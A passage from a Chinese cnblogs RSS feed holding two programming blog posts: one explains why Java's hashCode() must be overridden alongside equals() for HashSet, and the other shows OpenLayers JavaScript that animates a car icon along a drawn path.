     但是，程序员应该意识到，为不相等的对象生成不同整数结果可以提高哈希表的性能。      
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;整理&lt;/code&gt; : hashCode()和equals()保持一致，如果equals方法返回true，那么两个对象的hasCode()返回值必须一样。如果equals方法返回false，hashcode可以不一样，但是这样不利于哈希表的性能，一般我们也不要这样做。&lt;/p&gt;
&lt;p&gt;假设两个对象，重写了其equals方法，其相等条件是某属性相等，就返回true。如果不重写hashcode方法，其返回的依然是两个对象的内存地址值，必然不相等。这就出现了equals方法相等，但是hashcode不相等的情况。这不符合hashcode的规则。&lt;/p&gt;
&lt;h4 id=&quot;hashset和map集合类型&quot;&gt;2、HashSet和Map集合类型&lt;/h4&gt;
&lt;p&gt;重写equals()方法就必须重写hashCode()方法主要是针对HashSet和Map集合类型,而对于List集合倒没什么影响。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;原因&lt;/code&gt;： 在向HashSet集合中存入一个元素时，HashSet会调用该对象（存入对象）的hashCode()方法来得到该对象的hashCode()值，然后&lt;code&gt;根据该hashCode值决定该对象在HashSet中存储的位置&lt;/code&gt;。简单的说：&lt;code&gt;HashSet集合判断两个元素相等的标准是：两个对象通过equals()方法比较相等，并且两个对象的HashCode()方法返回值也相等&lt;/code&gt;。如果两个元素通过equals()方法比较返回true，但是它们的hashCode()方法返回值不同，HashSet会把它们存储在不同的位置，依然可以添加成功。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这就是问题所在&lt;/code&gt;：就是如果你只重写equals()方法，而不重写hashCode(),如果equals()为true,而它们的hashCode()方法返回值肯定不一样，因为它们都不是同一对象所以内存地址肯定不一样，所以它还是添加成功了，那么其实你写的equals()方法根本没啥软用。&lt;/p&gt;
&lt;h4 id=&quot;代码示例&quot;&gt;3、代码示例&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;1、People类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;重写equals方法,但并没有hashCode方法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class People {
    private String name;
    private Integer age;

    public People(String name, Integer age) {
        this.name = name;
        this.age = age;
    }

    /**
     * 重写 equals 方法
     */
    @Override
    public boolean equals(Object obj) {
        People u = (People) obj;
        return this.getName().equals(u.getName()) &amp;amp;&amp;amp; (this.age.equals(u.getAge()));
    }
    /**
     * 重写 toString 方法
     */
    @Override
    public String toString() {
        return &quot;People{&quot; +
                &quot;name='&quot; + name + '\'' +
                &quot;, age=&quot; + age +
                '}';
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2、实现类&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    public static void main(String[] args) {
        HashSet&amp;lt;People&amp;gt; hashSet = Sets.newHashSet();
        People people1 = new People(&quot;小小&quot;,3);
        People people2 = new People(&quot;中中&quot;,4);
        People people3 = new People(&quot;中中&quot;,4);
        People people4 = new People(&quot;大大&quot;,5);
        hashSet.add(people1);
        hashSet.add(people2);
        hashSet.add(people3);
        hashSet.add(people4);

        System.out.println(hashSet);
        //输出:[People{name='小小', age=3}, People{name='中中', age=4}, People{name='大大', age=5}, People{name='中中', age=4}]
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;很明显,我重写了equals方法,那么people2和people3的equals应该相同，所以不能放入HashSet,但它们的hashCode()方法返回不同，所以导致同样能放入HashSet。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;重点&lt;/code&gt;：对于Set集合必须要同时重写这两个方法，要不然Set的特性就被破坏了。&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;只要自己变优秀了，其他的事情才会跟着好起来（少将8）&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sun, 28 Apr 2019 13:57:00 +0000</pubDate>
<dc:creator>雨点的名字</dc:creator>
<og:description>java代码之美（12） CollectionUtils工具类 这篇讲的CollectionUtils工具类是在 的, 而不是springframework下的CollectionUtils。 个人觉</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qdhxhz/p/10787130.html</dc:identifier>
</item>
<item>
<title>OpenLayer实现路径运动 - 小龙女先生</title>
<link>http://www.cnblogs.com/cqhaibin/p/10786886.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cqhaibin/p/10786886.html</guid>
<description>&lt;p&gt;     近期由于业务的需求，让我这从未想过要碰Web Gis的业余前端开发者，走了Web Gis的开发道路。功能需求很简单，但却也是让自己难为了好几天。如，应该选择那个Gis框架，Gis框架的兼容性如何，直接Ie哪些版，能不能简单到只有一张图片就行解决问题，等等。。。。。。&lt;/p&gt;
&lt;p&gt;在如此多的技术盲点，以及不确定的因素，我开始了征程，现将一些心得做些记录。&lt;/p&gt;
&lt;h2&gt;一、需求分析&lt;/h2&gt;
&lt;p&gt;     客户需要的功能就是能在一张Gis图上实现小车根据路径进行移动，为什么一定要Gis呢(这是客户指定需求，无语一该)。并且客户还说底图要很容易更换，但他想要用Gis表现的却是室内的地理信息，我也没办法用baidu, 高德等现成的Gis接口。&lt;/p&gt;
&lt;p&gt;针对上述需求，我没有去了解过多的web gis框架。因为客户对Gis的概念就是能放大，缩小，可以做路径规划等。所以我就选择ol，利用他的静态图片(选择这个是为满足客户灵活更新底图的需求)做Gis底图的功能来解决此问题。&lt;/p&gt;
&lt;h2&gt;二、效果展示&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/cqhaibin/1049064/o_ol-trace.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;三、伪代码实现&lt;/h2&gt;
&lt;p&gt;由于是技术验证代码， 有些杂乱，现只给出关键性代码。如有业务需要欢迎共同讨论。&lt;/p&gt;
&lt;h3&gt;3.1 实现路径的绘制&lt;/h3&gt;
&lt;p&gt;此步骤还是相对简单的，主要用到Ol的Draw对象，代码哪下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;draw(type){
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.stopdraw();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._draw = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Draw({
            source: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.layer.getSource(),
            type: type &lt;/span&gt;== 'Icon' ? 'Point'&lt;span&gt; : type
        });
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._draw.on('drawend', (event)=&amp;gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(type == 'LineString'&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.traceLine =&lt;span&gt; event.feature;
            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(type != 'Icon') &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            let f &lt;/span&gt;=&lt;span&gt; event.feature;
            f.setStyle(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Style({
                image: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Icon({
                    src: &lt;/span&gt;'/content/battery.gif'&lt;span&gt;
                }),
                text: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Text({
                    text: &lt;/span&gt;'new item'&lt;span&gt;,
                    fill: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Fill({
                        color: &lt;/span&gt;&quot;red&quot;&lt;span&gt;
                    })
                })
            }));
            f.type &lt;/span&gt;= 'battery'&lt;span&gt;;
        });
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.map.addInteraction(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;._draw);
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._snap = &lt;span&gt;new&lt;/span&gt; Snap({source: &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.layer.getSource()});
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.map.addInteraction(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;._snap);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;关键代码在于drawend事件的监听，如果是LineString情况，就将此feature放在一个共公变量，方便路径运行时使用。&lt;/p&gt;

&lt;h3&gt;3.2 分解路径数据&lt;/h3&gt;
&lt;p&gt;     此部分就是获取到3.1步骤的路径路径，然后进行解析，因为3.1上的linestring是多个线段的集合，但运动其本质就是改变图标的坐标，使其快速且连续的变化就形成了移动效果。所以这里有一个方法进行路径细分，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;cutTrace(){
        let traceCroods &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceLine.getGeometry().getCoordinates(); 
        let len &lt;/span&gt;=&lt;span&gt; traceCroods.length;
        let destCroods &lt;/span&gt;=&lt;span&gt; [];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; len - 1; ++&lt;span&gt;i){
            let bPoint &lt;/span&gt;=&lt;span&gt; traceCroods[i];
            let ePoint &lt;/span&gt;= traceCroods[i+1&lt;span&gt;];
            let bevelling &lt;/span&gt;= Math.sqrt(Math.pow(ePoint[0] - bPoint[0], 2&lt;span&gt;)
            &lt;/span&gt;+ Math.pow(ePoint[1] - bPoint[1], 2&lt;span&gt;) );
            let cosA &lt;/span&gt;= (ePoint[0] - bPoint[0]) /&lt;span&gt; bevelling;
            let sinA &lt;/span&gt;= (ePoint[1] - bPoint[1]) /&lt;span&gt; bevelling;
            
            let curStep &lt;/span&gt;= 0&lt;span&gt;;
            let step &lt;/span&gt;= 5&lt;span&gt;;
            destCroods.push(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Point([bPoint[0], bPoint[1&lt;span&gt;]]));
            &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt;{
                curStep&lt;/span&gt;++&lt;span&gt;;
                let nextPoint;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(curStep * step &amp;gt;=&lt;span&gt; bevelling){
                    nextPoint &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Point([ePoint[0], ePoint[1&lt;span&gt;]]);
                }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                    nextPoint &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Point([
                        cosA &lt;/span&gt;* curStep * step + bPoint[0&lt;span&gt;]
                        ,
                        sinA &lt;/span&gt;* curStep * step + bPoint[1&lt;span&gt;]
                    ]);
                }
                destCroods.push(nextPoint);
            }&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curStep * step &amp;lt;&lt;span&gt; bevelling);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; destCroods;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中用到了一些数学上的三角函数和计算方法。此方法最终选一个根据步长计算后的坐标集合。&lt;/p&gt;

&lt;h3&gt;3.3 利用postcompose实现运动效果&lt;/h3&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;tracerun(){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;this&lt;/span&gt;.traceLine) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.traceCroods = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.cutTrace();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.now = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date().getTime();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.map.on('postcompose', &lt;span&gt;this&lt;/span&gt;.moveFeature.bind(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.map.render();
    }
    moveFeature(event){
        let vCxt &lt;/span&gt;=&lt;span&gt; event.vectorContext;
        let fState &lt;/span&gt;=&lt;span&gt; event.frameState;
        let elapsedTime &lt;/span&gt;= fState.time - &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.now;
        let index &lt;/span&gt;= Math.round(300 * elapsedTime / 1000&lt;span&gt;);
        let len &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceCroods.length;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(index &amp;gt;=&lt;span&gt; len){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;stop&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.map.un('postcompose', &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.moveFeature);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
        let dx, dy, rotation;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.traceCroods[index] &amp;amp;&amp;amp; &lt;span&gt;this&lt;/span&gt;.traceCroods[index + 1&lt;span&gt;]){
            let isRigth &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            let bCrood &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceCroods[index].getCoordinates();
            let eCrood &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;.traceCroods[index + 1&lt;span&gt;].getCoordinates();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(bCrood[0] &amp;lt; eCrood[0&lt;span&gt;]){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;左-&amp;gt;右&lt;/span&gt;
                isRigth = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
            }
            dx &lt;/span&gt;= bCrood[0] - eCrood[0&lt;span&gt;];
            dy &lt;/span&gt;= bCrood[1] - eCrood[1&lt;span&gt;];

            rotation &lt;/span&gt;=&lt;span&gt; Math.atan2(dy,dx);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(rotation &amp;gt; (Math.PI / 2&lt;span&gt;)){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;修正&lt;/span&gt;
                rotation =  Math.PI -&lt;span&gt; rotation;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(rotation &amp;lt; -1 * (Math.PI / 2&lt;span&gt;)){
                rotation &lt;/span&gt;= -1 * Math.PI -&lt;span&gt; rotation;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                rotation &lt;/span&gt;= -&lt;span&gt;rotation;
            }
            console.log(dx &lt;/span&gt;+ '  ' + dy + '  ' +&lt;span&gt; rotation);
            let curPoint &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.traceCroods[index];
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; anchor = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Feature(curPoint);
            let style &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Style({
                image: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Icon({
                    img: isRigth &lt;/span&gt;? &lt;span&gt;this&lt;/span&gt;.carRight : &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.carImg,
                    imgSize: [&lt;/span&gt;32,32&lt;span&gt;],
                    rotateWithView: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
                    rotation: rotation
                }),
                text: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Text({
                    text: &lt;/span&gt;'Car'&lt;span&gt;,
                    fill: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Fill({
                        color: &lt;/span&gt;'red'&lt;span&gt;
                    }),
                    offsetY: &lt;/span&gt;-20&lt;span&gt;
                })
            });  
            vCxt.drawFeature(anchor, style);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;this.map.getView().setCenter(bCrood);&lt;/span&gt;
&lt;span&gt;        }
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.map.render();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    此移动代码的是用ol的postcompose事件进行实现的，因为render方法执行完成后会触发postcompose事件，所以就代替了定时器的的实现方案。其中rotation根据两点坐标计算出移动图标的斜度、以及移动的方向等，更为影响的展示。&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 13:36:00 +0000</pubDate>
<dc:creator>小龙女先生</dc:creator>
<og:description>近期由于业务的需求，让我这从未想过要碰Web Gis的业余前端开发者，走了Web Gis的开发道路。功能需求很简单，但却也是让自己难为了好几天。如，应该选择那个Gis框架，Gis框架的兼容性如何，直接</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/cqhaibin/p/10786886.html</dc:identifier>
</item>
</channel>
</rss>